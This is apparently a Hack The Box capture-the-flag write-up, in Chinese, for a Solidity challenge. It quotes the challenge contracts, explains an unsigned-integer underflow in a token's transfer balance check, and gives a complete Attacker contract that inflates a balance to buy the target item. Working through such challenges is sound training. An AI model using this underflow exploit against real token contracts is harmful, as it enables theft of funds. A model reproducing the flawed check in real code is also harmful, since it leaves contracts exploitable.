---
title: HTB Blockchain Challenge - Token to Wonderland
date: {{ date }}
cover   : "/img/htb5.jpeg"
tags: Blockchain SmartContract Exploit
---

* 先看程式碼
* Setup.sol
```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {SilverCoin} from "./SilverCoin.sol";
import {Shop} from "./Shop.sol";

contract Setup {
    Shop public immutable TARGET;

    constructor(address _player) payable {
        require(msg.value == 1 ether);
        SilverCoin silverCoin = new SilverCoin();
        silverCoin.transfer(_player, 100);
        TARGET = new Shop(address(silverCoin));
    }

    function isSolved(address _player) public view returns (bool) {
        (,, address ownerOfKey) = TARGET.viewItem(2);
        return ownerOfKey == _player;
    }
}

```
* Shop.sol

```
pragma solidity ^0.7.0;

import {SilverCoin} from "./SilverCoin.sol";

contract Shop {
    struct Item {
        string name;
        uint256 price;
        address owner;
    }

    Item[] public items;
    SilverCoin silverCoin;

    constructor(address _silverCoinAddress) {
        silverCoin = SilverCoin(_silverCoinAddress);
        items.push(Item("Diamond Necklace", 1_000_000, address(this)));
        items.push(Item("Ancient Stone", 70_000, address(this)));
        items.push(Item("Golden Key", 25_000_000, address(this)));
    }

    function buyItem(uint256 _index) public {
        Item memory _item = items[_index];
        require(_item.owner == address(this), "Item already sold");
        bool success = silverCoin.transferFrom(msg.sender, address(this), _item.price);
        require(success, "Payment failed!");
        items[_index].owner = msg.sender;
    }

    function viewItem(uint256 _index) public view returns (string memory, uint256, address) {
        return (items[_index].name, items[_index].price, items[_index].owner);
    }
}

```
* 很明顯，題目是要我們取得 第二個 item
* Setup 合約只給我們 100 SilverCoin
* 要想辦法湊錢買到 25_000_000 SilverCoin 的物品

### 思路
* 要想辦法撈錢
* 直到有辦法從 Shop/SilverCoin Contract 提出 25_000_000 
* 但是題目只有給 Shop, Setup 的地址
* 但因為 SilverCoin 是由 Setup 所呼叫生成，因此可以透過 Ethereum 合約地址生成的機制，來計算 SilverCoin 的地址
* `address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator_account, bytes1(0x01))))));`



### SilverCoin.sol
* Transfer
```

 function _transfer(address from, address to, uint256 amount) internal {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        uint256 fromBalance = _balances[from];
        require(fromBalance - amount >= 0, "ERC20: transfer amount exceeds balance");
        _balances[from] = fromBalance - amount;
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }
```

* 可以看到 `require(fromBalance - amount >= 0, "ERC20: transfer amount exceeds balance");` fromBalance 是 unsigned integer
* 因此 amount > fromBalance造成 underflow 會自動轉換為正整數 $2^{256} - 1$
* 因此我們變很容易的讓我們帳戶餘額暴增到可以購買 item 2


* Attacker.sol

```
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import {SilverCoin} from "./SilverCoin.sol";
import {Shop} from "./Shop.sol";
import {Setup} from "./Setup.sol";
contract Attacker{
    SilverCoin public silvercoin;
    Shop shop;
    Setup setup;
    uint256 public maxx;
    constructor(Setup _setup){
        setup = _setup;
        silvercoin = SilverCoin(getContractAddress(address(_setup)));
        shop = setup.TARGET();
    }
    function getContractAddress(address creator_account) public pure returns (address) {
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), creator_account, bytes1(0x01))))));
    }
    function attack(address player) public {
        silvercoin.transfer(address(this), 10000000000);
        silvercoin.increaseAllowance(address(shop), 25000100);
        shop.buyItem(2);
        setup.isSolved(address(this));

    }
    function getSilverCoin() public view returns(address){
        return address(silvercoin);
    }
}
```
